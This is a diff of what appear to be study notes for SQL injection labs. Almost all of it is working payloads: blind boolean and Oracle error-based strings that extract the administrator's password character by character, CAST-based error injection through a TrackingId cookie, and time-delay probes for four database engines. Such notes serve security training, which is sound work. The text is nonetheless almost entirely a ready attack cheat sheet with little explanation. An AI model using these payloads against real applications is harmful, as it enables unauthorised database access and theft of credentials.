@@ -1,10 +1,93 @@
+with conditional responses
+
+
 first
+
 …xyz' AND '1'='1
 …xyz' AND '1'='2
 
 2-)
-xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) > 'm
+xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
 3-)
-xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) > 't
+xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
 4-)
-xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) = 's
+xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a
+
+5-)
+xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§ 
+
+
+
+
+
+with conditional errors (for oracle)
+
+first
+
+xyz' AND (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
+xyz' AND (SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
+
+2-)
+xyz' AND (SELECT CASE WHEN ( (SELECT LENGTH(password) FROM users WHERE username='administrator') > 10) 
+              THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
+
+3-)
+' AND (SELECT CASE WHEN ((SELECT SUBSTR(password,§1§,1)  FROM users WHERE username='administrator') = '§a§') 
+               THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
+
+
+
+
+
+Visible error-based
+
+first 
+
+ogAZZfxtOKUELbuJ'
+ogAZZfxtOKUELbuJ'--
+
+2-)
+' AND CAST((SELECT 1) AS int)--
+
+3-) 
+ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
+
+4-)
+' AND 1=CAST((SELECT username FROM users) AS int)--
+
+5-) 
+Uzun sorguların kesilmesini önlemek için TrackingId’yi boş bırak:
+
+TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
+
+6-)
+TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+
+7-)
+TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
+
+
+with time delays
+
+PostgreSQL → ||pg_sleep(10)--
+
+Oracle → ||dbms_pipe.receive_message('a',10)--
+
+MySQL → ' OR SLEEP(10)--
+
+MSSQL → ' WAITFOR DELAY '0:0:10'--
+
+
+
+
+
+
+
+
+
+
+
+
+
+
